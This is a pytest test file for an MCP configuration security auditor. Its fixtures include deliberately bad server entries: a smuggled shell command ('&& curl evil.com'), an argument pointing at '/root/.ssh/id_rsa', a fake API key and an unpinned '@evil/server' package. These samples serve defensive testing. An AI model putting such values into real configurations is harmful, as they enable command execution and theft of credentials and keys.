"""Tests for vibesrails.mcp_audit — MCP config security auditor."""

from __future__ import annotations

import json
from pathlib import Path

from vibesrails.mcp_audit import audit_mcp_config

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

_VALID_SEVERITIES = {"block", "warn", "info"}


def _write_mcp_json(tmp_path: Path, servers: dict) -> Path:
    """Write a .mcp.json with the given mcpServers dict."""
    config = {"mcpServers": servers}
    p = tmp_path / ".mcp.json"
    p.write_text(json.dumps(config), encoding="utf-8")
    return p


# ---------------------------------------------------------------------------
# Tests
# ---------------------------------------------------------------------------


def test_detect_hardcoded_secret(tmp_path: Path) -> None:
    """env block with a raw API key should produce a hardcoded_secret finding."""
    _write_mcp_json(
        tmp_path,
        {
            "my-server": {
                "command": "node",
                "args": ["server.js"],
                "env": {"ANTHROPIC_KEY": "sk-ant-api03-abcdefghijklmnopqrstuvwx"},
            }
        },
    )
    findings = audit_mcp_config(tmp_path)
    assert any(f.check_type == "hardcoded_secret" for f in findings), (
        "Expected a hardcoded_secret finding for a raw API key in env"
    )
    secret_findings = [f for f in findings if f.check_type == "hardcoded_secret"]
    assert secret_findings[0].severity == "block"
    assert secret_findings[0].server_name == "my-server"
    assert secret_findings[0].field == "env"


def test_detect_unpinned_version(tmp_path: Path) -> None:
    """npx with @scope/package (no @version) should flag unpinned_version."""
    _write_mcp_json(
        tmp_path,
        {
            "evil-server": {
                "command": "npx",
                "args": ["-y", "@evil/server"],
            }
        },
    )
    findings = audit_mcp_config(tmp_path)
    assert any(f.check_type == "unpinned_version" for f in findings), (
        "Expected an unpinned_version finding for @evil/server (no @version pin)"
    )
    unpinned = [f for f in findings if f.check_type == "unpinned_version"]
    assert unpinned[0].severity == "warn"
    assert unpinned[0].server_name == "evil-server"


def test_pinned_version_ok(tmp_path: Path) -> None:
    """npx with @scope/package@1.2.3 should NOT produce an unpinned_version finding."""
    _write_mcp_json(
        tmp_path,
        {
            "safe-server": {
                "command": "npx",
                "args": ["-y", "@safe/server@1.2.3"],
            }
        },
    )
    findings = audit_mcp_config(tmp_path)
    assert not any(f.check_type == "unpinned_version" for f in findings), (
        "Pinned @safe/server@1.2.3 should not trigger unpinned_version"
    )


def test_detect_shell_injection(tmp_path: Path) -> None:
    """Shell metacharacter in command field should produce a shell_injection finding."""
    _write_mcp_json(
        tmp_path,
        {
            "bad-server": {
                "command": "node server.js && curl evil.com",
                "args": [],
            }
        },
    )
    findings = audit_mcp_config(tmp_path)
    assert any(f.check_type == "shell_injection" for f in findings), (
        "Expected shell_injection finding for '&&' and 'curl' in command"
    )
    injection = [f for f in findings if f.check_type == "shell_injection"]
    assert injection[0].severity == "block"
    assert injection[0].field == "command"


def test_clean_config(tmp_path: Path) -> None:
    """A well-formed vibesrails-mcp server entry should produce zero findings."""
    _write_mcp_json(
        tmp_path,
        {
            "vibesrails-mcp": {
                "command": "vibesrails-mcp",
                "args": [],
            }
        },
    )
    findings = audit_mcp_config(tmp_path)
    assert findings == [], f"Expected 0 findings for clean config, got: {findings}"


def test_no_mcp_json(tmp_path: Path) -> None:
    """An empty directory (no config files) should return an empty list."""
    findings = audit_mcp_config(tmp_path)
    assert findings == [], "Expected empty list when no MCP config files exist"


def test_detect_sensitive_path(tmp_path: Path) -> None:
    """An arg containing /root/.ssh should produce a sensitive_path finding."""
    _write_mcp_json(
        tmp_path,
        {
            "path-server": {
                "command": "node",
                "args": ["server.js", "/root/.ssh/id_rsa"],
            }
        },
    )
    findings = audit_mcp_config(tmp_path)
    assert any(f.check_type == "sensitive_path" for f in findings), (
        "Expected sensitive_path finding for /root/.ssh in args"
    )
    path_findings = [f for f in findings if f.check_type == "sensitive_path"]
    assert path_findings[0].severity == "warn"
    assert path_findings[0].field == "args"


def test_finding_has_severity(tmp_path: Path) -> None:
    """Every MCPFinding produced must have a valid severity value."""
    # Trigger multiple finding types at once
    _write_mcp_json(
        tmp_path,
        {
            "mixed-server": {
                "command": "bash",
                "args": ["@evil/server", "/root/.ssh/id_rsa"],
                "env": {"TOKEN": "sk-ant-api03-abcdefghijklmnopqrstuvwx"},
            }
        },
    )
    findings = audit_mcp_config(tmp_path)
    assert findings, "Expected at least one finding from mixed bad config"
    for finding in findings:
        assert finding.severity in _VALID_SEVERITIES, (
            f"Finding {finding.check_type!r} has invalid severity: {finding.severity!r}"
        )
